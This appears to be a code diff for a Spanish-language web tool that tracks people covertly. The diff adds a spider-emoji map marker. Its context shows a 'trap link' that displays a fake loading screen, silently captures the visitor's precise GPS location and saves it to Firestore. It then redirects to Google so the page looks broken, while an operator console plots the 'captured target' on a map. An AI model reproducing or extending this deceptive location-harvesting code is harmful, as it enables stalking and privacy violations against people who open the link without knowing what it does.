@@ -23,14 +23,21 @@ const ubicacionPorDefecto = [14.3333, -90.6667];
 const urlParams = new URLSearchParams(window.location.search);
 const targetId = urlParams.get('target');
 
+// Crear un icono personalizado con el emoji de araña 🕷️
+const iconoArana = L.divIcon({
+    className: 'custom-spider-icon',
+    html: '<div style="font-size: 28px; text-align: center; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.6));">🕷️</div>',
+    iconSize: [30, 30],
+    iconAnchor: [15, 15]
+});
+
 document.addEventListener("DOMContentLoaded", function () {
     // ESCENARIO A: Si alguien abrió el enlace trampa en su celular
     if (targetId) {
-        // Muestra una pantalla en blanco o de carga genérica instantánea
         document.body.style.backgroundColor = "#ffffff";
         document.body.innerHTML = "<div style='display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;color:#666;'><h3>Cargando recurso...</h3></div>";
         iniciarCapturaDiscreta(targetId);
-        return; // Detiene la carga de la interfaz de la consola en este dispositivo
+        return; 
     }
 
     // ESCENARIO B: Estás en tu consola principal (PC); inicializamos el mapa
@@ -41,7 +48,8 @@ document.addEventListener("DOMContentLoaded", function () {
         attribution: '&copy; OpenStreetMap contributors'
     }).addTo(map);
 
-    marker = L.marker(ubicacionPorDefecto).addTo(map)
+    // Colocar el marcador de araña inicial
+    marker = L.marker(ubicacionPorDefecto, { icon: iconoArana }).addTo(map)
         .bindPopup("<b>Sistema en línea.</b> Esperando señal...")
         .openPopup();
 
@@ -63,21 +71,19 @@ window.compartirEnlace = function() {
     });
 };
 
-// Capturar ubicación una sola vez discretamente y cerrar/salir de la página
+// Capturar ubicación discretamente y salir
 function iniciarCapturaDiscreta(id) {
     if (!navigator.geolocation) {
         window.location.href = "https://www.google.com";
         return;
     }
 
-    // Usamos getCurrentPosition para obtener el punto exacto al instante de abrir y cerrar
     navigator.geolocation.getCurrentPosition(
         async (position) => {
             const lat = position.coords.latitude;
             const lng = position.coords.longitude;
 
             try {
-                // Guarda las coordenadas en Firestore para que queden guardadas en tu consola
                 await setDoc(doc(db, "ratreos", id), {
                     lat: lat,
                     lng: lng,
@@ -87,11 +93,9 @@ function iniciarCapturaDiscreta(id) {
                 console.error("Error al guardar:", e);
             }
             
-            // Pestañea y redirige fuera del sitio (parecerá que la página falló o expiró)
             window.location.href = "https://www.google.com";
         },
         (error) => {
-            // Si rechaza el permiso o falla, lo saca de igual forma discretamente
             window.location.href = "https://www.google.com";
         },
         { enableHighAccuracy: true, timeout: 10000 }
@@ -108,10 +112,12 @@ function escucharObjetivoRemoto(id) {
 
             map.invalidateSize();
             map.setView([lat, lng], 16);
-            marker.setLatLng([lat, lng]);
-            marker.bindPopup(`<b>¡Objetivo Guardado!</b><br>Lat: ${lat.toFixed(4)}<br>Lng: ${lng.toFixed(4)}`).openPopup();
             
-            document.getElementById('banner-status').innerHTML = "SEÑAL CAPTURADA<br>REGISTRO GUARDADO";
+            // Actualiza la posición manteniendo el icono de la araña 🕷️
+            marker.setLatLng([lat, lng]);
+            marker.bindPopup(`<b>¡Objetivo Atrapado!</b><br>Lat: ${lat.toFixed(4)}<br>Lng: ${lng.toFixed(4)}`).openPopup();
+            
+            document.getElementById('banner-status').innerHTML = "SEÑAL CAPTURADA<br>ARAÑA POSICIONADA";
         }
     });
 }
